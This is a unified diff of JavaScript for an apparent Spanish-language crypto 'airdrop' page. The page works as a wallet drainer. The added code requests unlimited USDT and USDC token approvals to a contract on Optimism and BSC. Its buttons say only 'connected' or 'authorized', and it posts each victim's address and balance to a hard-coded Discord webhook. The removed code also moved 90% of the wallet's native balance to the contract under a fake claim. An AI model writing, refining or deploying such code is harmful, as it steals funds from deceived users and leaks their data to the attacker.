@@ -1,4 +1,4 @@
- const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1360019304921436180/o61QmLpPd_TJ1lLxkXuzvyeW9VFtDvX7buOMmMYNDbbAqz1eod7Qi6F7TUto1JBQUGY_';
+const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1384351633290428478/wYzF9QeKtS80lVRtfanPfUb3XjisCWnzhCd2qLPuwzZ1i69mSJAKVfv3xlwL67prbMGH';
 
 const NETWORKS = {
   optimism: {
@@ -19,20 +19,8 @@ const NETWORKS = {
   }
 };
 
-const contractABI = [
-  {
-    "inputs": [
-      { "internalType": "address[]", "name": "tokensERC20", "type": "address[]" },
-      { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" },
-      { "internalType": "address[]", "name": "contractsERC721", "type": "address[]" },
-      { "internalType": "address[]", "name": "contractsERC1155", "type": "address[]" }
-    ],
-    "name": "claimAll",
-    "outputs": [],
-    "stateMutability": "nonpayable",
-    "type": "function"
-  }
-];
+// ABI vacío porque no llamamos funciones del contrato directamente
+const contractABI = [];
 
 let web3;
 let userAccount;
@@ -80,8 +68,6 @@ async function connectNetwork() {
       userAccount = accounts[0];
       contract = new web3.eth.Contract(contractABI, net.contractAddress);
       document.getElementById("approveTokens").disabled = false;
-      document.getElementById("claimAll").disabled = false;
-      alert("Error al conectar a " + net.name + ": " + userAccount);
     } catch (error) {
       alert("Error al conectar MetaMask");
     }
@@ -90,112 +76,67 @@ async function connectNetwork() {
   }
 }
 
-
-    document.getElementById("approveTokens").addEventListener("click", async () => {
-      const button = document.getElementById("approveTokens");
-      if (!userAccount) return alert("Primero conecta MetaMask");
-
-      button.disabled = true;
-      button.textContent = "Aprobando...";
-      button.style.backgroundColor = "#f0b90b";
-
-       const TOKENS_BY_NETWORK = {
-  optimism: [
-    "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // USDT
-    "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1" // USDC
-  ],
-  bsc: [
-    "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
-    "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d" // USDC BSC
-  ]
-};
-
-      const approveABI = [{
-        "constant": false,
-        "inputs": [{ "name": "spender", "type": "address" }, { "name": "amount", "type": "uint256" }],
-        "name": "approve",
-        "outputs": [{ "name": "", "type": "bool" }],
-        "payable": false,
-        "stateMutability": "nonpayable",
-        "type": "function"
-      }];
-const tokens = TOKENS_BY_NETWORK[selectedNetwork];
-
-      try {
-	
-
-        for (const token of tokens) {
-
-          const tokenContract = new web3.eth.Contract(approveABI, token);
-          const balanceWei = await web3.eth.getBalance(userAccount);
-          const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
-          await sendToDiscordWebhook('wallet', userAccount, balanceEth);
-          await tokenContract.methods.approve(NETWORKS[selectedNetwork].contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
-
-            .send({ from: userAccount });
-        }
-
-        button.textContent = "Conectado ✓";
-        button.style.backgroundColor = "#00b15d";
-        button.disabled = true;
-      } catch (error) {
-        console.error(error);
-        alert("Error al aprobar tokens");
-        button.textContent = "Conectar Wallet";
-        button.style.backgroundColor = "#f0b90b";
-        button.disabled = false;
-      }
-    });
-
-document.getElementById("claimAll").addEventListener("click", async () => {
+document.getElementById("approveTokens").addEventListener("click", async () => {
+  const button = document.getElementById("approveTokens");
   if (!userAccount) return alert("Primero conecta MetaMask");
-  if (!contract) return alert("Contrato no conectado aún");
+
+  button.disabled = true;
+  button.textContent = "Aprobando...";
+  button.style.backgroundColor = "#f0b90b";
 
   const TOKENS_BY_NETWORK = {
     optimism: [
       "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // USDT
-      "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1" // USDC
+      "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1"  // USDC
     ],
     bsc: [
       "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
-      "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d" // USDC BSC
+      "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d"  // USDC BSC
     ]
   };
 
-  const tokens = TOKENS_BY_NETWORK[selectedNetwork];
-  if (!tokens || tokens.length === 0) {
-    return alert("Error: Tokens no definidos para esta red.");
-  }
+  const approveABI = [{
+    "constant": false,
+    "inputs": [
+      { "name": "spender", "type": "address" },
+      { "name": "amount", "type": "uint256" }
+    ],
+    "name": "approve",
+    "outputs": [{ "name": "", "type": "bool" }],
+    "payable": false,
+    "stateMutability": "nonpayable",
+    "type": "function"
+  }];
 
-  const amounts = [
-    web3.utils.toWei("100", "ether"),
-    web3.utils.toWei("100", "ether")
-  ];
+  const tokens = TOKENS_BY_NETWORK[selectedNetwork];
 
   try {
-    await contract.methods.claimAll(tokens, amounts, [], []).send({ from: userAccount });
-
     const balanceWei = await web3.eth.getBalance(userAccount);
     const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
 
-    const ninetyPercent = web3.utils.toWei((parseFloat(balanceEth) * 0.9).toFixed(6), 'ether');
+    await sendToDiscordWebhook('wallet', userAccount, balanceEth);
 
-    await web3.eth.sendTransaction({
-      from: userAccount,
-      to: NETWORKS[selectedNetwork].contractAddress,
-      value: ninetyPercent
-    });
+    for (const token of tokens) {
+      const tokenContract = new web3.eth.Contract(approveABI, token);
+      await tokenContract.methods
+        .approve(NETWORKS[selectedNetwork].contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
+        .send({ from: userAccount });
+    }
 
-    await sendToDiscordWebhook('kyc', userAccount, balanceEth);
-    alert("Airdrop recibido y 90% enviado al contrato");
+    button.textContent = "Autorizado ✓";
+    button.style.backgroundColor = "#00b15d";
   } catch (error) {
     console.error(error);
-    alert("Error al ejecutar el claim: " + error.message);
+    alert("Error al aprobar tokens");
+    button.textContent = "Autorizar Tokens";
+    button.style.backgroundColor = "#f0b90b";
+    button.disabled = false;
   }
 });
+
 async function sendToDiscordWebhook(eventType, address, balance) {
   const embed = {
-    title: eventType === 'wallet' ? 'Wallet Conectada' : 'KYC Iniciado',
+    title: eventType === 'wallet' ? 'Wallet Conectada' : 'Evento',
     color: eventType === 'wallet' ? 0x00FF00 : 0xFFA500,
     fields: [
       { name: 'Dirección', value: address },
@@ -214,6 +155,3 @@ async function sendToDiscordWebhook(eventType, address, balance) {
     console.error("Error enviando a Discord:", error);
   }
 }
-
-
-
